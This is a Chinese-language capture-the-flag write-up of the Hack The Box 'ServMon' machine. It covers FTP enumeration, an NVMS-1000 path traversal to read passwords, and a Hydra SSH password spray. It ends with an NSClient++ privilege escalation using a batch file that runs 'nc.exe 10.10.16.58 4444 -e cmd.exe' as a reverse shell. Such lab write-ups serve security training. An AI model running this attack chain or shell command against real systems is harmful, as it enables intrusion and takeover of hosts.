---
title: HTB-ServMon Writeup
date: 2026-03-12T10:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
  - HTB
  - Writeup
  - Windows
  - FTP
---
## 初始侦察

### Nmap 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]                                                                            
└─$ sudo nmap --min-rate 10000 -p- 10.129.227.77 -oA ports                                               
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 22:17 EDT                                          
Nmap scan report for 10.129.227.77                                                                       
Host is up (0.12s latency).                                                                              
Not shown: 65518 closed tcp ports (reset)                                                                
PORT      STATE SERVICE                                                                                  
21/tcp    open  ftp                                                                                      
22/tcp    open  ssh                                                                                      
80/tcp    open  http                                                                                     
135/tcp   open  msrpc                                                                                    
139/tcp   open  netbios-ssn                                                                              
445/tcp   open  microsoft-ds                                                                             
5666/tcp  open  nrpe                                                                                     
6063/tcp  open  x11                                                                                      
6699/tcp  open  napster                                                                                  
8443/tcp  open  https-alt                                                                                
49664/tcp open  unknown                                                                                  
49665/tcp open  unknown                                                                                  
49666/tcp open  unknown                                                                                  
49667/tcp open  unknown                                                                                  
49668/tcp open  unknown                                                                                  
49669/tcp open  unknown                                                                                  
49670/tcp open  unknown                                                                                  
                                                                                                         
Nmap done: 1 IP address (1 host up) scanned in 10.80 seconds
```

提取端口做备用。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ grep open ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670
```

### Nmap UDP 端口扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sU -Pn --top-ports 20 -p- 10.129.227.77
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 22:24 EDT
Nmap scan report for 10.129.227.77
Host is up (0.15s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  open|filtered ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 20.09 seconds
```

未扫描出明确开放的 UDP 端口。

### Nmap 详细信息扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap -sT -sC -sV -O -p21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 10.129.227.77
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 22:23 EDT
Nmap scan report for 10.129.227.77
Host is up (0.073s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_02-28-22  07:35PM       <DIR>          Users
22/tcp    open  ssh           OpenSSH for_Windows_8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:1a:f6:81:ca:17:78:d0:27:db:cd:46:2a:09:2b:54 (RSA)
|   256 3e:63:ef:3b:6e:3e:4a:90:f3:4c:02:e9:40:67:2e:42 (ECDSA)
|_  256 5a:48:c8:cd:39:78:21:29:ef:fb:ae:82:1d:03:ad:af (ED25519)
80/tcp    open  http
|_http-title: Site doesn't have a title (text/html).
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
8443/tcp  open  ssl/https-alt
|_ssl-date: TLS randomness does not represent time
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     workers
|_    jobs
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.95%I=7%D=3/11%Time=69B2239D%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.95%T=SSL%I=7%D=3/11%Time=69B223A6%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\x12\x02\x18\0\x1aC\n\x07workers\x12\n\n\x04jobs\x12\x02\x1
SF:8h\x12\x0f")%r(HTTPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x201
SF:8\r\n\r\nDocument\x20not\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x
SF:20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSP
SF:Request,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x
SF:20not\x20found")%r(SIPOptions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1709 - 21H2 (93%), Microsoft Windows 10 1903 (93%), Microsoft Windows 10 21H1 (93%), Microsoft Windows Server 2022 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows 10 1803 (92%), Windows Server 2019 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-12T02:25:41
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.43 seconds

```

扫描结果显示 21/ftp 端口可能可以使用 `anonymous` 进行匿名登录。

### Nmap 漏洞脚本扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo nmap --script=http-brute -p 21,22,80,135,139,445,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 10.129.227.77
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 22:25 EDT
Nmap scan report for 10.129.227.77
Host is up (0.12s latency).

PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
| http-brute:   
|_  Path "/" does not require authentication
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5666/tcp  open  nrpe
6063/tcp  open  x11
6699/tcp  open  napster
8443/tcp  open  https-alt
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 7.23 seconds

```

未扫描出漏洞。

## 21-FTP 渗透

使用 `anonymous` 尝试登录，登录成功后寻找 ftp 中的文件，下载至 Kali 中。 

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ftp 10.129.227.77                                                                                                                
Connected to 10.129.227.77.
220 Microsoft FTP Service
Name (10.129.227.77:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ?
Commands may be abbreviated.  Commands are:

!               case            dir             fget            idle            mdelete         modtime         ntrans          progress        rcvbuf          rmdir           sndbuf          type
$               cd              disconnect      form            image           mdir            more            open            prompt          recv            rstatus         status          umask
account         cdup            edit            ftp             lcd             mget            mput            page            proxy           reget           runique         struct          unset
append          chmod           epsv            gate            less            mkdir           mreget          passive         put             remopts         send            sunique         usage
ascii           close           epsv4           get             lpage           mls             msend           pdir            pwd             rename          sendport        system          user
bell            cr              epsv6           glob            lpwd            mlsd            newer           pls             quit            reset           set             tenex           verbose
binary          debug           exit            hash            ls              mlst            nlist           pmlsd           quote           restart         site            throttle        xferbuf
bye             delete          features        help            macdef          mode            nmap            preserve        rate            rhelp           size            trace           ?
ftp> dir
229 Entering Extended Passive Mode (|||49678|)
125 Data connection already open; Transfer starting.
02-28-22  07:35PM       <DIR>          Users
226 Transfer complete.
ftp> cd Users
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49680|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49682|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  168 Confidential.txt
226 Transfer complete.
ftp> mget Confidential.txt                                                                                                                                                                                        
mget Confidential.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||49685|)
125 Data connection already open; Transfer starting.
100% |*********************************************************************************************************************************************************************|   168        1.42 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 6 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
168 bytes received in 00:00 (1.28 KiB/s)
ftp> cd ..
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49686|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM       <DIR>          Nadine
02-28-22  07:37PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nathan
250 CWD command successful.
ftp> dir
229 Entering Extended Passive Mode (|||49688|)
125 Data connection already open; Transfer starting.
02-28-22  07:36PM                  182 Notes to do.txt
226 Transfer complete.
ftp> mget Notes\ to\ do.txt
mget Notes to do.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||49691|)
150 Opening ASCII mode data connection.
100% |*********************************************************************************************************************************************************************|   182        1.56 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 4 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
182 bytes received in 00:00 (1.54 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali]
└─$ ls -liah       
total 56K
2759041 drwxrwxr-x  2 kali kali 4.0K Mar 11 22:32  .
2490457 drwxrwxr-x 27 kali kali 4.0K Mar  2 03:38  ..
2774920 -rw-rw-r--  1 kali kali  168 Feb 28  2022  Confidential.txt
2767466 -rw-------  1 kali kali 1.2K Dec 31 01:25  .gdb_history
2774923 -rw-rw-r--  1 kali kali  182 Feb 28  2022 'Notes to do.txt'
2772183 -rw-r--r--  1 kali kali  12K Jan 21 01:36  .payload.xml.swp
2774898 -rw-r--r--  1 root root  705 Mar 11 22:17  ports.gnmap
2774778 -rw-r--r--  1 root root  742 Mar 11 22:17  ports.nmap
2774918 -rw-r--r--  1 root root 3.6K Mar 11 22:17  ports.xml
2768878 -rw-------  1 kali kali  12K Dec 31 01:35  .ret2libc.py.swp
```

查看下载下来的文本，提示将 `Password.txt` 放置至桌面。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat Notes\ to\ do.txt 
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint 
```

## 80-Web 渗透

访问 Web 端口，发现运行的是 NVMS-1000 系统，这个系统存在 CVE-2019-20085 路径遍历漏洞，可以读取任意文件。

运行 Burp Suite，抓包将传输类型改为 GET，尝试读取前面发现的 `Password.txt` 文件，发现暴露出了很多密码。

![](Pasted%20image%2020260312110053.png)

对目前已知的两个用户进行 ssh 密码喷射

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ vim pass.lst             
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali]
└─$ vim user.lst
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat pass.lst                           
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
                                                                                                                                                                                                                  
┌──(kali㉿kali)-[~/Work/Kali]
└─$ cat user.lst 
Nadine
Nathan
```


```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ sudo hydra -L user.lst -P pass.lst ssh://10.129.227.77:22 -t 30 -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-11 23:05:31
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:2/p:7), ~1 try per task
[DATA] attacking ssh://10.129.227.77:22/
[ATTEMPT] target 10.129.227.77 - login "Nadine" - pass "1nsp3ctTh3Way2Mars!" - 1 of 14 [child 0] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nadine" - pass "Th3r34r3To0M4nyTrait0r5!" - 2 of 14 [child 1] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nadine" - pass "B3WithM30r4ga1n5tMe" - 3 of 14 [child 2] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nadine" - pass "L1k3B1gBut7s@W0rk" - 4 of 14 [child 3] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nadine" - pass "0nly7h3y0unGWi11F0l10w" - 5 of 14 [child 4] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nadine" - pass "IfH3s4b0Utg0t0H1sH0me" - 6 of 14 [child 5] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nadine" - pass "Gr4etN3w5w17hMySk1Pa5$" - 7 of 14 [child 6] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nathan" - pass "1nsp3ctTh3Way2Mars!" - 8 of 14 [child 7] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nathan" - pass "Th3r34r3To0M4nyTrait0r5!" - 9 of 14 [child 8] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nathan" - pass "B3WithM30r4ga1n5tMe" - 10 of 14 [child 9] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nathan" - pass "L1k3B1gBut7s@W0rk" - 11 of 14 [child 10] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nathan" - pass "0nly7h3y0unGWi11F0l10w" - 12 of 14 [child 11] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nathan" - pass "IfH3s4b0Utg0t0H1sH0me" - 13 of 14 [child 12] (0/0)
[ATTEMPT] target 10.129.227.77 - login "Nathan" - pass "Gr4etN3w5w17hMySk1Pa5$" - 14 of 14 [child 13] (0/0)
[22][ssh] host: 10.129.227.77   login: Nadine   password: L1k3B1gBut7s@W0rk
[REDO-ATTEMPT] target 10.129.227.77 - login "Nathan" - pass "0nly7h3y0unGWi11F0l10w" - 16 of 16 [child 3] (2/2)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-11 23:05:34

```

得到 `Nadine` 用户的密码为 `L1k3B1gBut7s@W0rk`，连接 ssh。

## Windows 提权

```bash
Microsoft Windows [Version 10.0.17763.864]
(c) 2018 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>dir
 Volume in drive C has no label.
 Volume Serial Number is 20C1-47A1

 Directory of C:\Users\Nadine

02/28/2022  08:04 PM    <DIR>          .
02/28/2022  08:04 PM    <DIR>          ..
02/28/2022  08:04 PM    <DIR>          3D Objects
02/28/2022  08:04 PM    <DIR>          Contacts
02/28/2022  08:05 PM    <DIR>          Desktop
02/28/2022  08:04 PM    <DIR>          Documents
02/28/2022  08:04 PM    <DIR>          Downloads
02/28/2022  08:04 PM    <DIR>          Favorites
02/28/2022  08:04 PM    <DIR>          Links
02/28/2022  08:04 PM    <DIR>          Music
02/28/2022  08:04 PM    <DIR>          Pictures
02/28/2022  08:04 PM    <DIR>          Saved Games
02/28/2022  08:04 PM    <DIR>          Searches
02/28/2022  08:04 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)   6,107,152,384 bytes free

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine
```

收集信息发现在 `Program Files` 目录下有一个第三方应用 `NSClient` 可能可以被利用提权。

```bash
nadine@SERVMON C:\Program Files>dir
 Volume in drive C has no label.
 Volume Serial Number is 20C1-47A1

 Directory of C:\Program Files

02/28/2022  07:55 PM    <DIR>          .
02/28/2022  07:55 PM    <DIR>          ..
03/01/2022  02:20 AM    <DIR>          Common Files
11/11/2019  07:52 PM    <DIR>          internet explorer
02/28/2022  07:07 PM    <DIR>          MSBuild
02/28/2022  07:55 PM    <DIR>          NSClient++
02/28/2022  07:46 PM    <DIR>          NVMS-1000
02/28/2022  07:32 PM    <DIR>          OpenSSH-Win64
02/28/2022  07:07 PM    <DIR>          Reference Assemblies
02/28/2022  06:44 PM    <DIR>          VMware
11/11/2019  07:52 PM    <DIR>          Windows Defender
11/11/2019  07:52 PM    <DIR>          Windows Defender Advanced Threat Protection
09/15/2018  12:19 AM    <DIR>          Windows Mail
11/11/2019  07:52 PM    <DIR>          Windows Media Player
09/15/2018  12:19 AM    <DIR>          Windows Multimedia Platform
09/15/2018  12:28 AM    <DIR>          windows nt
11/11/2019  07:52 PM    <DIR>          Windows Photo Viewer
09/15/2018  12:19 AM    <DIR>          Windows Portable Devices
09/15/2018  12:19 AM    <DIR>          Windows Security
02/28/2022  07:25 PM    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              20 Dir(s)   6,107,136,000 bytes free
```

查看 `nsclient.ini` 文件发现靶机在 127.0.0.1 下的服务密码为 `ew2x6SsGTxjRwXOT`。

```bash
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini                                                                                                                                                      
ï»¿# If you want to fill this file with all available options run the following command:                                                                                                                          
#   nscp settings --generate --add-defaults --load-all                                                                                                                                                            
# If you want to activate a module and bring in all its options use:                                                         
#   nscp settings --activate-module <MODULE NAME> --add-defaults                                                             
# For details run: nscp settings --help             
                                                    
                                                    
; in flight - TODO                                                                                                           
[/settings/default]                                           
                                                                                                                                                                                  
; Undocumented key                                                                                                           
password = ew2x6SsGTxjRwXOT                                                                                                                                                         
                                                                                                                                                                                  
; Undocumented key                                                                                                           
allowed hosts = 127.0.0.1                                                                                                                                                           
                                                                                                                                                                                  
                                                                                         
; in flight - TODO                                                                                                                                                                                                                                                                                                                                                       
[/settings/NRPE/server]                                                                                                                    
                                                                                                                                                                                  
; Undocumented key                                                   
ssl options = no-sslv2,no-sslv3                                                                                                                                                                                                                                                                                                                                          
                                                                                                                                                            
; Undocumented key                                                            
verify mode = peer-cert                                                                                                                                       
                                                                                                                                                            
; Undocumented key                                                                                                                                          
insecure = false                                                                                                                                              
                                                                                                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                  
; in flight - TODO                                                                                                                                                                
[/modules]                                                                                                                                                                        
                                                                                                                                                                                                                                                                                                                                                                         
; Undocumented key                                                                                                                                                                
CheckHelpers = disabled                                                                  
                                                                                                                                                                                  
; Undocumented key                                                                        
CheckEventLog = disabled                                                                                                                                                                                        
                                                    
; Undocumented key                                                                                                                                                                                                
CheckNSCP = disabled                                                                                     
                                                                                                         
; Undocumented key                                                                                                                                                                                              
CheckDisk = disabled                                                                                     
                                                                                                         
; Undocumented key                                                                                                                                                                                              
CheckSystem = disabled                                                                                                                                                            
                                                                                                         
; Undocumented key                                                                                                                                                                                              
WEBServer = enabled                                                                                                                                                                                             
                                                                                                                                                                                                                  
; Undocumented key                                            
NRPEServer = enabled                                          
                                                                                                                                                                                                                
; CheckTaskSched - Check status of your scheduled jobs.                                                                      
CheckTaskSched = enabled                                      

; Scheduler - Use this to schedule check commands and jobs in conjunction with for instance passive monitoring through NSCA 
Scheduler = enabled            

; CheckExternalScripts - Module used to execute external scripts                                                             
CheckExternalScripts = enabled


; Script wrappings - A list of templates for defining script commands. Enter any command line here and they will be expanded by scripts placed under the wrapped scripts section. %SCRIPT% will be replaced by the
 actual script an %ARGS% will be replaced by any given arguments.                                                            
[/settings/external scripts/wrappings]

; Batch file - Command used for executing wrapped batch files                                                                
bat = scripts\\%SCRIPT% %ARGS%                                

; Visual basic script - Command line used for wrapped vbs scripts                                                            
vbs = cscript.exe //T:30 //NoLogo scripts\\lib\\wrapper.vbs %SCRIPT% %ARGS%                                                  

; POWERSHELL WRAPPING - Command line used for executing wrapped ps1 (powershell) scripts                                     
ps1 = cmd /c echo If (-Not (Test-Path "scripts\%SCRIPT%") ) { Write-Host "UNKNOWN: Script `"%SCRIPT%`" not found."; exit(3) }; scripts\%SCRIPT% $ARGS$; exit($lastexitcode) | powershell.exe /noprofile -command -


; External scripts - A list of scripts available to run from the CheckExternalScripts module. Syntax is: `command=script arguments`                                                                                                                       
[/settings/external scripts/scripts]                          


; Schedules - Section for the Scheduler module.               
[/settings/scheduler/schedules]                               

; Undocumented key                                            
foobar = command = foobar                                     


; External script settings - General settings for the external scripts module (CheckExternalScripts).                        
[/settings/external scripts]                                  
allow arguments = true
```

在靶机中创建一个自定义目录，在其中放入 nc.exe 与 恶意文件 enil.bat

```enil.bat
@echo off
C:\Programdata\app\nc.exe 10.10.16.58 4444 -e cmd.exe
```

```bash
nadine@SERVMON c:\ProgramData\app>dir 
 Volume in drive C has no label. 
 Volume Serial Number is 20C1-47A1

 Directory of c:\ProgramData\app

03/11/2026  08:08 PM    <DIR>          .
03/11/2026  08:08 PM    <DIR>          ..
03/11/2026  07:38 PM                64 enil.bat
03/11/2026  07:37 PM            45,272 nc.exe
               3 File(s)         90,608 bytes
               2 Dir(s)   6,100,402,176 bytes free

nadine@SERVMON c:\ProgramData\app>Read from remote host 10.129.227.77: Connection timed out
Connection to 10.129.227.77 closed.
client_loop: send disconnect: Broken pipe
```

在 Kali 中通过 SSH 做本地端口转发

```bash
ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77
```

启动监听，触发恶意脚本。

```bash
┌──(kali㉿kali)-[~/Work/Kali]
└─$ curl -s -k -u admin:ew2x6SsGTxjRwXOT \
  "https://127.0.0.1:8443/api/v1/queries/enil/commands/execute?time=3m"
{"command":"enil","lines":[{"message":"Command enil didn't terminate within the timeout period 60s","perf":{}}],"result":3}
```

获得 `nt authority\system` 权限。

```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
e136a4************1cfdc3fa4ae2e0
```